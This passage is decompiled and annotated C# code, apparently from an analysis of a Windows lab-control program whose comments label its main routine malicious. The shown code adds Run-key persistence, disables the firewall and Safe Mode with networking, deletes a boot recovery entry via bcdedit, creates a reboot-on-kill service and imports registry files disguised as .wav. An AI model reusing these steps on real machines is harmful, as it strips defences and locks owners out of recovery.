				this.m_GroupBox11 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton19（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060000A2 RID: 162 RVA: 0x000057C0 File Offset: 0x000039C0
		// (set) Token: 0x060000A3 RID: 163 RVA: 0x000023B9 File Offset: 0x000005B9
		internal virtual RadioButton RadioButton19
		{
			get
			{
				return this.m_RadioButton19;
			}
			set
			{
				this.m_RadioButton19 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton20（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060000A4 RID: 164 RVA: 0x000057D4 File Offset: 0x000039D4
		// (set) Token: 0x060000A5 RID: 165 RVA: 0x000023C2 File Offset: 0x000005C2
		internal virtual RadioButton RadioButton20
		{
			get
			{
				return this.m_RadioButton20;
			}
			set
			{
				this.m_RadioButton20 = value;
			}
		}

		/// <summary>
		/// 控件 Label22（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060000A6 RID: 166 RVA: 0x000057E8 File Offset: 0x000039E8
		// (set) Token: 0x060000A7 RID: 167 RVA: 0x000023CB File Offset: 0x000005CB
		internal virtual Label Label22
		{
			get
			{
				return this.m_Label22;
			}
			set
			{
				this.m_Label22 = value;
			}
		}

		/// <summary>
		/// 控件 Label23（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000A8 RID: 168 RVA: 0x000057FC File Offset: 0x000039FC
		// (set) Token: 0x060000A9 RID: 169 RVA: 0x000023D4 File Offset: 0x000005D4
		internal virtual Label Label23
		{
			get
			{
				return this.m_Label23;
			}
			set
			{
				this.m_Label23 = value;
			}
		}

		/// <summary>
		/// P/Invoke(user32)：SystemParametersInfo(20=SPI_SETDESKWALLPAPER,...) 用于 SetWallpaper 刷新壁纸。
		/// </summary>
		// Token: 0x060000AA RID: 170
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern bool SystemParametersInfo(int uiAction, int uiParam, string pvParam, int fWinIni);

		/// <summary>
		/// P/Invoke(user32)：BlockInput 声明（声明但未实际调用）。
		/// </summary>
		// Token: 0x060000AB RID: 171
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern object BlockInput(long blockIt);

		/// <summary>
		/// P/Invoke(kernel32)：Sleep 毫秒延时（保存流程末尾 Sleep(2000) 后杀 explorer）。
		/// </summary>
		// Token: 0x060000AC RID: 172
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern void Sleep(long milliseconds);

		// Token: 0x060000AD RID: 173
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int ClipCursor(Form1.RECT lpRect);

		/// <summary>
		/// Load 事件（状态机还原）：读 HKCU\Software\jfglzs\dzjs 填入 TextBox1；为空则依次自动探测 studentMain/ClassMangerApp/REDAgent 进程路径；
		/// 再读 usb_jianche/shadu_jianche/cmd_jianche/win_jian/games_jianche/bianhao/xiazai/gaowei/zcb 各开关，按保存时的 off/on 语义恢复对应 RadioButton 状态。
		/// </summary>
		// Token: 0x060000AE RID: 174 RVA: 0x00005810 File Offset: 0x00003A10
		// [反混淆] 原状态机117行 → 还原为正常控制流86行
		private void Form_Load_ReadConfigAndPopulate(object sender, EventArgs e)
		{
			try
			{
				// 1) 读取已保存的学生端路径；为空则依次自动探测进程
				this.studentExePath = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "dzjs", ""));
				if (Operators.CompareString(this.studentExePath, "", false) == 0)
				{
					// 依次探测 studentMain → ClassMangerApp → REDAgent
					this.studentExePath = this.GetRunningProcessPath("studentMain");
					if (Operators.CompareString(this.studentExePath, "", false) == 0)
					{
						this.studentExePath = this.GetRunningProcessPath("ClassMangerApp");
					}
					if (Operators.CompareString(this.studentExePath, "", false) == 0)
					{
						this.studentExePath = this.GetRunningProcessPath("REDAgent");
					}
					if (Operators.CompareString(this.studentExePath, "", false) != 0)
					{
						this.TextBox1.Text = "自动获得文件路径是：" + this.studentExePath;
					}
				}
				else
				{
					this.TextBox1.Text = this.studentExePath;
				}
				// 2) USB 检查开关（off=勾选“禁用USB”）
				this.usbCheckValue = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", ""));
				if (Operators.CompareString(this.usbCheckValue, "off", false) == 0)
				{
					this.RadioButton1.Checked = true;
				}
				else
				{
					this.RadioButton2.Checked = true;
				}
				// 3) 杀毒软件检查开关
				string shaduCheckValue = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", ""));
				if (Operators.CompareString(shaduCheckValue, "off", false) == 0)
				{
					this.RadioButton3.Checked = true;
				}
				else
				{
					this.RadioButton4.Checked = true;
				}
				// 4) CMD 检查开关
				string cmdCheckValue = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", ""));
				if (Operators.CompareString(cmdCheckValue, "off", false) == 0)
				{
					this.RadioButton5.Checked = true;
				}
				else
				{
					this.RadioButton6.Checked = true;
				}
				// 5) 任务栏右键开关（保存时 on=禁止 → 界面恢复时勾选“禁止”）
				string winCheckValue = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "win_jian", ""));
				if (Operators.CompareString(winCheckValue, "on", false) == 0)
				{
					this.RadioButton11.Checked = true;
				}
				else
				{
					this.RadioButton12.Checked = true;
				}
				// 6) 小游戏开关
				string gamesCheckValue = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "games_jianche", ""));
				if (Operators.CompareString(gamesCheckValue, "off", false) == 0)
				{
					this.RadioButton14.Checked = true;
				}
				else
				{
					this.RadioButton13.Checked = true;
				}
				// 7) 编号开关
				string bianhaoValue = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "bianhao", ""));
				if (Operators.CompareString(bianhaoValue, "off", false) == 0)
				{
					this.RadioButton10.Checked = true;
				}
				else
				{
					this.RadioButton9.Checked = true;
				}
				// 8) 下载开关
				string xiazaiValue = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "xiazai", ""));
				if (Operators.CompareString(xiazaiValue, "on", false) == 0)
				{
					this.RadioButton7.Checked = true;
				}
				else
				{
					this.RadioButton8.Checked = true;
				}
				// 9) 高危等级：1→RB15（高）、2→RB16（中）、0→RB17（低）
				int gaoweiValue = Conversions.ToInteger(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 2));
				if (gaoweiValue == 1)
				{
					this.RadioButton15.Checked = true;
				}
				else if (gaoweiValue == 2)
				{
					this.RadioButton16.Checked = true;
				}
				else if (gaoweiValue == 0)
				{
					this.RadioButton17.Checked = true;
				}
				// 10) 注册表编辑器控制：2→RB19（完全禁止）、0→RB20（允许）
				int zcbValue = Conversions.ToInteger(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "zcb", 2));
				if (zcbValue == 2)
				{
					this.RadioButton19.Checked = true;
				}
				else if (zcbValue == 0)
				{
					this.RadioButton20.Checked = true;
				}
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// FormClosing 事件：ProjectData.EndApp() 直接结束进程。
		/// </summary>
		// Token: 0x060000AF RID: 175 RVA: 0x000023DD File Offset: 0x000005DD
		private void Form_FormClosing_ExitApp(object sender, FormClosingEventArgs e)
		{
			ProjectData.EndApp();
		}

		/// <summary>
		/// 点击"选择学生端"按钮：OpenFileDialog 选 exe，校验对应进程是否在运行（IsProcessRunning），存入 studentExePath。
		/// </summary>
		// Token: 0x060000B0 RID: 176 RVA: 0x00005E6C File Offset: 0x0000406C
		// [反混淆] 原状态机83行 → 还原为正常控制流24行
		private void Button2_Click_SelectStudentExe(object sender, EventArgs e)
		{
			try
			{
				this.OpenFileDialog1.ShowDialog();
				string fileName = this.OpenFileDialog1.FileName;
				string fileName2 = Path.GetFileName(fileName);
				Path.GetDirectoryName(fileName); // 原代码伪影：取目录名但未使用
				Path.GetExtension(fileName); // 原代码伪影：取扩展名但未使用
				// 进程未运行 → 提示重新选择；运行中 → 记录路径
				if (!this.IsProcessRunning(Strings.Replace(fileName2, ".exe", "", 1, -1, CompareMethod.Binary)))
				{
					Interaction.MsgBox("你所选的文件并没有运行，请重新选择或先运行电子教室！", MsgBoxStyle.OkOnly, null);
				}
				else
				{
					this.TextBox1.Text = this.OpenFileDialog1.FileName;
					this.studentExePath = this.OpenFileDialog1.FileName;
				}
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// 点击"保存设置"按钮（状态机还原的入口流程）：
		/// 1) IsPortOpen("www.baidu.com",443,2000) 不通 → 提示"网络不通!请先恢复网络，需要下载黑名单等。"并中止；
		/// 2) 未选学生端文件 → 提示"选择学生端程序文件!"；密码<6位或=="123456" → 提示；
		/// 3) 备份 hosts → hosts-bak（不存在才拷）；UpdateHostsBlacklist(本地 hmd_local.txt,"on") + UpdateHostsBlacklist(网络 hmd_net.txt,"on")；
		/// 4) PreSaveCleanup_KillOldProcesses() 清理旧环境 → SaveSettings_ApplyAllRestrictions() 正式施加全部限制。
		/// </summary>
		// Token: 0x060000B1 RID: 177 RVA: 0x00005FE4 File Offset: 0x000041E4
		// [反混淆] 原状态机79行 → 还原为正常控制流44行
		private void Button1_Click_SaveSettings(object sender, EventArgs e)
		{
			try
			{
				// 1) 网络检测：baidu:443 不通则中止
				if (!this.IsPortOpen("www.baidu.com", 443, 2000))
				{
					this.Label2.Text = "网络不通!请先恢复网络，需要下载黑名单等。";
					return;
				}
				// 2) 未选学生端文件
				if (Operators.CompareString(this.studentExePath, "", false) == 0)
				{
					this.Label2.Text = "选择学生端程序文件!";
					return;
				}
				// 3) 密码长度不足6位
				if (Strings.Len(this.pd_new.Text) < 6)
				{
					this.Label2.Text = "密码应该是6位或以上的字母或数字，请重新输入！";
					return;
				}
				// 4) 密码太简单
				if (Operators.CompareString(this.pd_new.Text, "123456", false) == 0)
				{
					this.Label2.Text = "密码太简单，请重新输入！";
					return;
				}
				// 5) 开始保存：备份 hosts（原文件/备份都不存在时才创建）
				this.Label2.Text = "";
				this.Button1.Enabled = false;
				if (!File.Exists(this.hostsFilePath))
				{
					File.Copy("hosts", this.hostsFilePath, true);
				}
				if (!File.Exists(this.hostsBackupPath))
				{
					File.Copy(this.hostsFilePath, this.hostsBackupPath, true);
				}
				// 6) 应用本地+网络黑名单
				this.UpdateHostsBlacklist(Application.StartupPath + "/hmd_local.txt", "on");
				this.UpdateHostsBlacklist("http://" + this.blacklistServerDomain + "/hmd_net.txt", "on");
				// 7) 清理旧环境 → 正式施加全部限制
				this.PreSaveCleanup_KillOldProcesses();
				this.SaveSettings_ApplyAllRestrictions();
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// 核心恶意逻辑（扁平化状态机还原后的顺序）：
		/// 1) 写 HKCU\Software\jfglzs 全部开关；密码哈希写 HKCU\Software\n；复制学生端 exe 备份并隐藏 SpecialSet.exe；
		/// 2) USB 控制：SYSTEM\...\Services\usbstor 及 ControlSet001~003 Start=3(允许)/4(禁止)；
		/// 3) HKLM RUN 自启动 przs.exe/jfglzsn.exe（写两遍）；关防火墙；DisableLockWorkstation=1；删除 SafeBoot\Network 键（禁用带网络安全模式）；
		/// 4) bcdedit 禁启动菜单 + 删系统恢复条目 {ee888888-...}；CleanQuickLaunchBar() 清快速启动栏；可达时 ReplaceBrowserShortcuts() 替换桌面浏览器；
		/// 5) sc create zmserv（binPath=StartupPath\zmserv.exe, start=auto）+ sc failure 配置（服务被杀 60 秒后自动重启机器）；
		/// 6) 小游戏/Edge/下载策略（IE Zones\3、Chrome/Edge DownloadRestrictions、Firefox DisableDownloads 等）；
		/// 7) hosts 与 drivers\etc 设 ReadOnly+Hidden+System；隐藏文件/扩展名；NoFolderOptions 按 xiazai 设置；禁注册表编辑器；禁 IPv6（DisabledComponents=255）；
		/// 8) 复制 jfglzsn/przs/zmserv.exe → c:\windows\jf\*.dat 并全部设 Hidden+System；
		/// 9) 删除临时 reg、Sleep(2000)、遍历 explorer Kill → 重启 explorer.exe → Reader.MyForms.Form3.Show() 完成提示。
		/// </summary>
		// Token: 0x060000B2 RID: 178 RVA: 0x00006298 File Offset: 0x00004498
		// [反混淆] 原状态机810行 → 还原为正常控制流（第1/2段）
		private void SaveSettings_ApplyAllRestrictions()
		{
			try
			{
				this.Cursor = Cursors.WaitCursor;
				// 1) 确保 HKCU\Software\jfglzs 键存在，写入全部界面开关（dzjs/各开关/zhuye）
				RegistryKey currentUser = Reader.MyComputer.Registry.CurrentUser;
				RegistryKey jfglzsKey = currentUser.OpenSubKey("Software\\jfglzs");
				if (jfglzsKey == null)
				{
					jfglzsKey = currentUser.CreateSubKey("Software\\jfglzs");
				}
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "dzjs", this.studentExePath, RegistryValueKind.String);
				// USB 检查：RB1=禁用(off)、RB2=允许(on)
				if (this.RadioButton1.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", "off", RegistryValueKind.String);
				}
				if (this.RadioButton2.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", "on", RegistryValueKind.String);
				}
				// 杀毒软件检查
				if (this.RadioButton3.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", "off", RegistryValueKind.String);
				}
				if (this.RadioButton4.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", "on", RegistryValueKind.String);
				}
				// CMD 检查
				if (this.RadioButton5.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", "off", RegistryValueKind.String);
				}
				if (this.RadioButton6.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", "on", RegistryValueKind.String);
				}
				// 任务栏右键
				if (this.RadioButton11.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "win_jian", "on", RegistryValueKind.String);
				}
				if (this.RadioButton12.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "win_jian", "off", RegistryValueKind.String);
				}
				// 编号
				if (this.RadioButton9.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "bianhao", "on", RegistryValueKind.String);
				}
				if (this.RadioButton10.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "bianhao", "off", RegistryValueKind.String);
				}
				// 小游戏
				if (this.RadioButton13.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "games_jianche", "on", RegistryValueKind.String);
				}
				if (this.RadioButton14.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "games_jianche", "off", RegistryValueKind.String);
				}
				// 下载
				if (this.RadioButton7.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "xiazai", "on", RegistryValueKind.String);
				}
				if (this.RadioButton8.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "xiazai", "off", RegistryValueKind.String);
				}
				// 高危等级
				if (this.RadioButton15.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 1, RegistryValueKind.DWord);
				}
				if (this.RadioButton16.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 2, RegistryValueKind.DWord);
				}
				if (this.RadioButton17.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 0, RegistryValueKind.DWord);
				}
				// 注册表编辑器：RB19=自动关闭(zcb=2)、RB20=完全禁止(zcb=0)
				if (this.RadioButton19.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "zcb", 2, RegistryValueKind.DWord);
				}
				if (this.RadioButton20.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "zcb", 0, RegistryValueKind.DWord);
				}
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "zhuye", this.blacklistServerDomain, RegistryValueKind.String);
				// 2) 复制学生端 exe 备份（路径+"2"），隐藏同目录 SpecialSet.exe
				string studentBackupPath = this.studentExePath + "2";
				File.Copy(this.studentExePath, studentBackupPath, true);
				string studentDir = Strings.Mid(this.studentExePath, 1, Strings.Len(this.studentExePath) - 16);
				File.SetAttributes(studentDir + "\\SpecialSet.exe", File.GetAttributes(studentDir + "\\SpecialSet.exe") | FileAttributes.Hidden | FileAttributes.System);
				// 3) 预置 DisableCMD=0、DisableRegistryTools=0、NoRun=0；删除旧 zmserv 服务
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", 0, RegistryValueKind.DWord);
				Interaction.Shell("sc delete zmserv", AppWinStyle.Hide, true, -1);
				// 4) 密码哈希（SHA256(密码+"bfdshgs")）→ 稍后写 HKCU\Software\n
				string passwordHash = ExceptionMock.ComputeSaltedSha256(Strings.Trim(this.pd_new.Text));
				// 5) regini 提权改注册表权限 + 导入伪装成 wav 的 yl.reg
				Interaction.Shell(Application.StartupPath + "\\regini.exe " + Application.StartupPath + "\\regqx.ini", AppWinStyle.Hide, true, -1);
				Thread.Sleep(1000);
				File.Copy(Application.StartupPath + "\\yl.wav", Application.StartupPath + "\\yl.reg", true);
				Interaction.Shell("regedit.exe /s " + Application.StartupPath + "\\yl.reg", AppWinStyle.Hide, true, -1);
				Thread.Sleep(1000);
				// 6) USB 控制：usbstor 服务 Start=3(允许)/4(禁止)，覆盖 CurrentControlSet 与 ControlSet001~003
				if (this.RadioButton1.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet001\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet002\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet003\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
				}
				if (this.RadioButton2.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet001\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet002\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet003\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
				}
				// 7) HKLM RUN 自启动 przs.exe / jfglzsn.exe（原代码写入两遍，中间 Sleep 1 秒）
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", Application.StartupPath + "\\przs.exe", RegistryValueKind.String);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", Application.StartupPath + "\\jfglzsn.exe", RegistryValueKind.String);
				Thread.Sleep(1000);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", Application.StartupPath + "\\przs.exe", RegistryValueKind.String);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", Application.StartupPath + "\\jfglzsn.exe", RegistryValueKind.String);
				// 8) 关闭防火墙（Standard/Public/DomainProfile 三处）；禁止锁工作站
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\DomainProfile\\PublicProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableLockWorkstation", 1, RegistryValueKind.DWord);
				// 9) 删除 SafeBoot\Network（禁用带网络的安全模式）；bcdedit 禁启动菜单 + 删系统恢复条目
				RegistryKey localMachine = Reader.MyComputer.Registry.LocalMachine;
				localMachine.DeleteSubKeyTree("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network");
				Interaction.Shell("cmd /c bcdedit /set {bootmgr} displaybootmenu no", AppWinStyle.MinimizedFocus, false, -1);
				Interaction.Shell("cmd /c bcdedit /delete {ee888888-8888-8888-8888-8888888888ee}", AppWinStyle.MinimizedFocus, false, -1);
				// 10) 清快速启动栏；黑名单服务器可达时替换桌面浏览器
				this.CleanQuickLaunchBar();
				if (this.IsPortOpen(this.blacklistServerDomain, 80, 2000))
				{
					this.ReplaceBrowserShortcuts();
				}
				// 11) regini 恢复注册表权限；重写 HKCU\Software\n 密码哈希；创建防删除自启动服务 zmserv（被杀 60 秒后自动重启机器）
				Interaction.Shell(Application.StartupPath + "\\regini.exe " + Application.StartupPath + "\\regqxoff.ini", AppWinStyle.Hide, true, -1);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "n", passwordHash, RegistryValueKind.String);
				string zmservPath = Application.StartupPath + "\\zmserv.exe";
				Interaction.Shell("sc create zmserv binPath= " + zmservPath + " start= auto", AppWinStyle.Hide, true, -1);
				Interaction.Shell("sc failure zmserv actions= \"reboot/60000/reboot/60000/reboot/60000\" reset= 300 ", AppWinStyle.Hide, true, -1);
				Thread.Sleep(1000);
				// 12) 确保 Google/Chrome 与 Microsoft/Edge 策略键存在
				RegistryKey googleKey = localMachine.OpenSubKey("Software\\Policies\\Google");
				if (googleKey == null)
				{
					googleKey = localMachine.CreateSubKey("Software\\Policies\\Google");
				}
				RegistryKey chromeKey = localMachine.OpenSubKey("Software\\Policies\\Google\\Chrome");
				if (chromeKey == null)
				{
					chromeKey = localMachine.CreateSubKey("Software\\Policies\\Google\\Chrome");
				}
				RegistryKey microsoftKey = localMachine.OpenSubKey("Software\\Policies\\Microsoft");
				if (microsoftKey == null)
				{
					microsoftKey = localMachine.CreateSubKey("Software\\Policies\\Microsoft");
				}
				RegistryKey edgeKey = localMachine.OpenSubKey("Software\\Policies\\Microsoft\\Edge");
				if (edgeKey == null)
				{
					edgeKey = localMachine.CreateSubKey("Software\\Policies\\Microsoft\\Edge");
				}
				// 13) 小游戏控制：RB13=允许 → 禁用恐龙/冲浪游戏；RB14=禁止 → 允许游戏并删除全部 IFEO 劫持键
				if (this.RadioButton13.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "AllowDinosaurEasterEgg", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "AllowSurfGame", 0, RegistryValueKind.DWord);
				}
				if (this.RadioButton14.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "AllowDinosaurEasterEgg", 1, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "AllowSurfGame", 1, RegistryValueKind.DWord);
					// 删除全部游戏相关的 IFEO 劫持键（原代码 PurblePlace.exe 删了两遍）
					RegistryKey ifeoKey = Reader.MyComputer.Registry.LocalMachine;
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sidebar.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Chess.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\FreeCell.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Hearts.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Minesweeper.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\PurblePlace.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Mahjong.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SpiderSolitaire.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\bckgzm.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chkrzm.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shvlzm.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Solitaire.exe");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\winmine");
					ifeoKey.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\PurblePlace.exe");
				}
				// 14) Edge/资源管理器策略：关小组件/搜索框/应用商店/任务视图，加速关机
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "WebWidgetAllowed", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Microsoft\\Windows\\CurrentVersion\\Search", "SearchboxTaskbarMode", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\WindowsStore", "RemoveWindowsStore", 1, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowTaskViewButton", 0, RegistryValueKind.DWord);
				ExceptionMock.DeleteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "DesktopProcess");
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Control Panel\\Desktop", "AutoEndTasks", 1, RegistryValueKind.String);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Control Panel\\Desktop", "HungAppTimeout", 500, RegistryValueKind.String);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Control Panel\\Desktop", "WaitToKillAppTimeout", 500, RegistryValueKind.String);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Serialize", "StartupDelayInMSec", 0, RegistryValueKind.DWord);
				// 15) RB11=允许任务栏右键 → 导入 huifu.reg（huifu.wav 伪装）并清除 NoTrayContextMenu
				if (this.RadioButton11.Checked)
				{
					File.Copy(Application.StartupPath + "\\huifu.wav", Application.StartupPath + "\\huifu.reg", true);
					Interaction.Shell("regedit.exe /s " + Application.StartupPath + "\\huifu.reg", AppWinStyle.Hide, true, -1);
					Thread.Sleep(1000);
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoTrayContextMenu", 0, RegistryValueKind.DWord);
				}
				// 16) RB8=禁止下载 → IE Zones\3、Chrome/Edge DownloadRestrictions、Firefox 全部禁止保存/下载
